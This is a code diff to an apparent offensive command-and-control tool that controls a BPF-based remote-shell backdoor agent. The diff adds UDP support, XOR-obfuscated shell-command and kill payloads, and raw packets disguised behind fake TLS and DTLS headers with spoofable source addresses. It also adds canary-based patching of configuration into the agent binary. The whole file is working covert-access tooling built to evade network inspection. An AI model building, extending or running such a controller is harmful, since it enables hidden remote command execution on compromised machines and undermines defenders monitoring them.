@@ -1,13 +1,19 @@
 from c2.view import C2View
 from pathlib import Path
 from importlib.resources import files
-from scapy.all import IP, TCP, send
+from scapy.all import IP, TCP, UDP, send
 import struct
 import argparse
 import logging
 
 
 class C2:
+    KILL = 0x01
+    SHELL = 0x02
+    TCP = 0xFF
+    UDP = 0xFE
+    CANARY = b"\x41\x39\x31\x54\x21\xff\x3d\xc1\x7a\x45\x1b\x4e\x31\x5d\x36\xc1"
+
     def __init__(self, args: argparse.Namespace, log_level: int = logging.INFO):
         self.args = args
         self.view = C2View(log_level=log_level, logfile=args.log_file)
@@ -21,9 +27,50 @@ class C2:
         Returns:
             bytes: Packed data to be stamped
         """
-        packed_data = struct.pack("!I36x", args.seq)
 
+        if args.protocol == "tcp":
+
+            protocol = self.TCP
+            port = 0
+            seq = args.seq
+        elif args.protocol == "udp":
+            protocol = self.UDP
+            port = args.dport
+            seq = 0
+        else:
+            raise ValueError(f"Unknown protocol: {args.protocol}")
+
+        config_format = "!BHI"
+        empty_byte_len = len(self.CANARY) - struct.calcsize(config_format)
+
+        packed_data = struct.pack(
+            f"{config_format}{empty_byte_len}x", protocol, port, seq
+        )
         return packed_data
+
+    def _generate_payload(self, args: argparse.Namespace, is_kill: bool) -> bytes:
+        """Generates the payload for the BPF Remote Shell Executable Agent.
+
+        Args:
+            args (argparse.Namespace): argparse arguments containing payload options.
+            is_kill (bool): Flag indicating if the payload is for a kill command.
+
+        Returns:
+            bytes: Payload to be sent in the Raw packet
+        """
+        if is_kill:
+            flag = self.KILL
+            command = b""
+        else:
+            flag = self.SHELL
+            command = args.command.encode(encoding="utf-8")
+
+        footer = struct.pack("!BI", flag, len(command))
+
+        payload = command + footer
+
+        payload = bytes([b ^ 0x4F for b in payload])
+        return payload
 
     def tcp_raw_send(self, args: argparse.Namespace) -> bool:
         """Sends a raw TCP packet to the configured agent.
@@ -33,15 +80,66 @@ class C2:
         """
 
         try:
-            command = args.command.encode(encoding="utf-8")
+            payload = self._generate_payload(args, False)
         except UnicodeEncodeError:
             self.view.print_error("Could not encode shell command.")
             return False
 
-        cmd_len = struct.pack("!I", len(command))
+        return self._send_fake_tls(payload, args)
 
-        payload = command + cmd_len
-        payload = bytes([b ^ 0x4F for b in payload])
+    def udp_raw_send(self, args: argparse.Namespace) -> bool:
+        """Sends a raw UDP packet to the configured agent.
+
+        Args:
+            args (argparse.Namespace): argparse arguments containing the UDP packet options.
+        """
+
+        try:
+            payload = self._generate_payload(args, False)
+        except UnicodeEncodeError:
+            self.view.print_error("Could not encode shell command.")
+        self._send_fake_dtls(payload, args)
+
+    def _send_fake_dtls(self, payload: bytes, args: argparse.Namespace) -> bool:
+        payload_len = struct.pack("!H", len(payload))
+
+        dtls_header = bytes.fromhex(
+            "1601000000000000000002008c1000008000020000000000807cbcc8946c2eef41707386769349e"
+            + "4d0c468d225ef1a77faa3cc26e4afbf33b46da3c41af57577158ac201503bbbf90b83f538cfeca5"
+            + "28026b72b0ac911c21ed575e5ab5805b31fd673615cad5e71bf6af85f667f005801c26d6f778398"
+            + "d41d6ed6846bf491ddea50940e92972ba87dea19ca359ffc6da42924c47a7589d0f841401000000"
+            + "00000000000300030100031601000001000000000000"
+        )
+        dtls_header += payload_len
+
+        packet = (
+            IP(dst=args.dip, src=args.sip)
+            / UDP(dport=args.dport, sport=args.sport)
+            / dtls_header
+            / payload
+        )
+
+        packet_len = len(packet)
+
+        if packet_len > 5000:
+            self.view.print_error("Packet size exceeds 5000 bytes. Aborting send.")
+            return False
+        self.view.print_msg(f"Sending: {packet.summary()}")
+        self.view.print_debug(f"Sending: {packet_len} bytes")
+        try:
+            send(packet, verbose=False)
+            self.view.print_success("Packet sent successfully.")
+        except PermissionError:
+            self.view.print_error(f"Failed to send packet. Are you root?")
+            return False
+        return True
+
+    def kill_agent(self, args: argparse.Namespace) -> bool:
+        payload = self._generate_payload(args, True)
+
+        return self._send_fake_tls(payload, args)
+
+    def _send_fake_tls(self, payload: bytes, args: argparse.Namespace) -> bool:
         payload_len = struct.pack("!H", len(payload))
 
         tls_header = bytes.fromhex(
@@ -58,10 +156,13 @@ class C2:
             / payload
         )
 
-        if len(packet) > 5000:
+        packet_len = len(packet)
+
+        if packet_len > 5000:
             self.view.print_error("Packet size exceeds 5000 bytes. Aborting send.")
             return False
         self.view.print_msg(f"Sending: {packet.summary()}")
+        self.view.print_debug(f"Sending: {packet_len} bytes")
         try:
             send(packet, verbose=False)
             self.view.print_success("Packet sent successfully.")
@@ -86,17 +187,18 @@ class C2:
             return False
 
         with open(path, "rb") as f:
-            agent_data = f.read()
+            data = f.read()
+        agent_data = bytearray(data)
 
-        canary = "According to all known laws of aviation"
-        index = agent_data.find(canary.encode(encoding="utf-8"))
+        index = agent_data.find(self.CANARY)
 
         if index == -1:
             self.view.print_error(f"Could not find agent canary.")
             return False
 
         packed_data = self._get_packed_config(args)
-        new_data = agent_data[:index] + packed_data + agent_data[index + len(canary) :]
+        new_data = agent_data
+        new_data[index : index + len(packed_data)] = packed_data
 
         output_dir = Path(args.output)
         output_dir.mkdir(parents=True, exist_ok=True)
